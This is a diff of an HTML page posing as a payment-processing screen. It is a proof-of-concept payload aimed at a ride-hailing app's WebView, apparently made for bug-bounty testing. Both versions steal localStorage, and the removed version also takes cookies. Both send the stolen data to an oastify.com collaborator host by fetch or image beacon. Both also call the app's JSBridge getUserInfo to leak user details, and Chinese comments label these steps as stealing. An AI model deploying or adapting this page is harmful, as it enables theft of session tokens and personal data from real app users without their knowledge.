@@ -1,66 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Payment Loading</title>
-</head>
 <body>
-  <h2>Processing payment...</h2>
+  <h2>Processing...</h2>
   <script>
-    // ====== 1. 窃取基础信息 ======
-    const data = {
-      url: location.href,
-      domain: document.domain,
-      title: document.title,
-      cookies: document.cookie || 'none',
-      localStorage: {},
-      userAgent: navigator.userAgent,
-      jsBridgeFound: []
-    };
-
-    // 获取 localStorage
+    // 1. 窃取所有 localStorage
+    const leak = {};
     for (let key in localStorage) {
-      data.localStorage[key] = localStorage.getItem(key);
+      leak[key] = localStorage.getItem(key);
     }
 
-    // ====== 2. 探测常见 JSBridge ======
-    const bridgeCandidates = [
-      'HuolalaJSBridge',
-      'HllBridge',
-      'JSInterface',
-      'Android',
-      'WebViewJavascriptBridge',
-      'cmbPayBridge'
-    ];
+    // 2. 编码为 URL 参数（避免特殊字符问题）
+    const params = new URLSearchParams();
+    params.append('data', btoa(unescape(encodeURIComponent(JSON.stringify(leak)))));
 
-    bridgeCandidates.forEach(name => {
-      if (window[name] && typeof window[name] === 'object') {
-        data.jsBridgeFound.push(name);
-        // 尝试调用通用方法（如 getUserInfo）
-        if (typeof window[name].getUserInfo === 'function') {
-          try {
-            window[name].getUserInfo((res) => {
-              fetch('http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/bridge-leak', {
-                method: 'POST',
-                body: JSON.stringify({ bridge: name, result: res })
-              }).catch(() => {});
-            });
-          } catch (e) {}
-        }
-      }
-    });
+    // 3. 用 <img> 发送（GET 请求）
+    const img = new Image();
+    img.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/leak?' + params.toString();
 
-    // ====== 3. 外传所有信息 ======
-    fetch('http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/poc-leak', {
-      method: 'POST',
-      body: JSON.stringify(data),
-      headers: { 'Content-Type': 'application/json' }
-    }).catch(() => {});
-
-    // ====== 4. 静默跳转（避免用户察觉）======
-    setTimeout(() => {
-      // 替换为货拉拉真实支付页（可选）
-      // location.href = "https://open.huolala.cn/order/pay";
-    }, 1500);
+    // 4. 可选：也尝试 JSBridge
+    if (window.HuolalaJSBridge?.getUserInfo) {
+      HuolalaJSBridge.getUserInfo((res) => {
+        const img2 = new Image();
+        img2.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/bridge?' + 
+                   new URLSearchParams({ bridge: JSON.stringify(res) });
+      });
+    }
   </script>
 </body>
 </html>
